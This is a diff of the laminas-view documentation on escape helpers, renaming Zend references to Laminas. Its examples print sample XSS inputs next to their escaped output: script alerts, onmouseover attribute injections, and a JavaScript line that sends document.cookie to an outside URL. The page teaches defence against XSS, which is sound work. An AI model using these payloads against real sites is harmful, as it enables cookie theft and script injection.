@@ -2,7 +2,7 @@
 
 The following helpers can **escape output in view scripts and defend from XSS
 and related vulnerabilities**. To escape different contexts of a HTML document,
-zend-view provides the following helpers:
+laminas-view provides the following helpers:
 
 * [`EscapeCss`](#escapecss)
 * [`EscapeHtml`](#escapehtml)
@@ -10,17 +10,17 @@ zend-view provides the following helpers:
 * [`EscapeJs`](#escapejs)
 * [`EscapeUrl`](#escapeurl)
 
-More informations to the operation and the background of security can be found
+More information to the operation and the background of security can be found
 in the
-[documentation of zend-escaper](https://docs.zendframework.com/zend-escaper/configuration/).
+[documentation of laminas-escaper](https://docs.laminas.dev/laminas-escaper/configuration/).
 
 > ### Installation Requirements
 >
-> The escape helpers depends on the zend-escaper component, so be sure to have
+> The escape helpers depends on the laminas-escaper component, so be sure to have
 > it installed before getting started:
 >
 > ```bash
-> $ composer require zendframework/zend-escaper
+> $ composer require laminas/laminas-escaper
 > ```
 
 ## EscapeCss
@@ -44,7 +44,7 @@ body\20 \7B \D \A \20 \20 \20 \20 background\2D image\3A \20 url\28 \27 http\3A 
 ## EscapeHtml
 
 ```php
-$html = "<script>alert('zend-framework')</script>";
+$html = "<script>alert('laminas-framework')</script>";
 
 echo $this->escapeHtml($html);
 ```
@@ -52,13 +52,13 @@ echo $this->escapeHtml($html);
 Output:
 
 ```html
-&lt;script&gt;alert(&#039;zend-framework&#039;)&lt;/script&gt;
+&lt;script&gt;alert(&#039;laminas-framework&#039;)&lt;/script&gt;
 ```
 
 ## EscapeHtmlAttr
 
 ```php+html
-<?php $html = 'faketitle onmouseover=alert(/zend-framework/);'; ?>
+<?php $html = 'faketitle onmouseover=alert(/laminas-framework/);'; ?>
 
 <a title=<?= $this->escapeHtmlAttr($html) ?>>click</a>
 ```
@@ -66,13 +66,13 @@ Output:
 Output:
 
 ```html
-<a title=faketitle&#x20;onmouseover&#x3D;alert&#x28;&#x2F;zend-framework&#x2F;&#x29;&#x3B;>click</a>
+<a title=faketitle&#x20;onmouseover&#x3D;alert&#x28;&#x2F;laminas-framework&#x2F;&#x29;&#x3B;>click</a>
 ```
 
 ## EscapeJs
 
 ```php
-$js = "window.location = 'https://framework.zend.com/?cookie=' + document.cookie";
+$js = "window.location = 'https://getlaminas.org/?cookie=' + document.cookie";
 
 echo $this->escapeJs($js);
 ```
@@ -80,7 +80,7 @@ echo $this->escapeJs($js);
 Output:
 
 ```js
-window.location\x20\x3D\x20\x27https\x3A\x2F\x2Fframework.zend.com\x2F\x3Fcookie\x3D\x27\x20\x2B\x20document.cookie
+window.location\x20\x3D\x20\x27https\x3A\x2F\x2Fgetlaminas.org\x2F\x3Fcookie\x3D\x27\x20\x2B\x20document.cookie
 ```
 
 ## EscapeUrl
@@ -88,7 +88,7 @@ window.location\x20\x3D\x20\x27https\x3A\x2F\x2Fframework.zend.com\x2F\x3Fcookie
 ```php
 <?php
 $url = <<<JS
-" onmouseover="alert('zf2')
+" onmouseover="alert('laminas')
 JS;
 ?>
 
@@ -98,7 +98,7 @@ JS;
 Output:
 
 ```html
-<a href="http://example.com/?name=%22%20onmouseover%3D%22alert%28%27zf2%27%29">click</a>
+<a href="http://example.com/?name=%22%20onmouseover%3D%22alert%28%27laminas%27%29">click</a>
 ```
 
 ## Using Encoding
@@ -108,7 +108,7 @@ $this->escapeHtml()->setEncoding('iso-8859-15');
 ```
 
 All allowed encodings can be found in the
-[documentation of zend-escaper](https://docs.zendframework.com/zend-escaper/configuration/).
+[documentation of laminas-escaper](https://docs.laminas.dev/laminas-escaper/configuration/).
 
 ### Get Current Value
 
@@ -142,7 +142,7 @@ $html = [
     ],
 ];
 
-var_dump($this->escapeHtml($html, Zend\View\Helper\EscapeHtml::RECURSE_ARRAY));
+var_dump($this->escapeHtml($html, Laminas\View\Helper\EscapeHtml::RECURSE_ARRAY));
 ```
 
 Output:
@@ -187,7 +187,7 @@ $object = new class {
     }
 };
 
-var_dump($this->escapeHtml($object, Zend\View\Helper\EscapeHtml::RECURSE_OBJECT));
+var_dump($this->escapeHtml($object, Laminas\View\Helper\EscapeHtml::RECURSE_OBJECT));
 ```
 
 Output:
@@ -207,7 +207,7 @@ $object = new class {
     public $headline = '<h1>Foo</h1>';
 };
 
-var_dump($this->escapeHtml($object, Zend\View\Helper\EscapeHtml::RECURSE_OBJECT));
+var_dump($this->escapeHtml($object, Laminas\View\Helper\EscapeHtml::RECURSE_OBJECT));
 ```
 
 Output:
@@ -221,11 +221,11 @@ array(1) {
 
 ## Using Custom Escaper
 
-Create an own instance of `Zend\Escaper\Escaper` and set to any of the escape
+Create an own instance of `Laminas\Escaper\Escaper` and set to any of the escape
 helpers:
 
 ```php
-$escaper = new Zend\Escaper\Escaper('utf-8');
+$escaper = new Laminas\Escaper\Escaper('utf-8');
 
 $this->escapeHtml()->setEscaper($escaper);
 ```
@@ -236,13 +236,13 @@ To get the current value, use the `getEscaper()` method.
 
 ```php
 <?php
-$escaper = new Zend\Escaper\Escaper('utf-8');
+$escaper = new Laminas\Escaper\Escaper('utf-8');
 $this->escapeHtml()->setEscaper($escaper);
 
-var_dump($this->escapeHtml()->getEscaper()); // instance of Zend\Escaper\Escaper
+var_dump($this->escapeHtml()->getEscaper()); // instance of Laminas\Escaper\Escaper
 ```
 
 ### Default Value
 
-The default value is an instance of `Zend\Escaper\Escaper`, created by the
+The default value is an instance of `Laminas\Escaper\Escaper`, created by the
 helper.
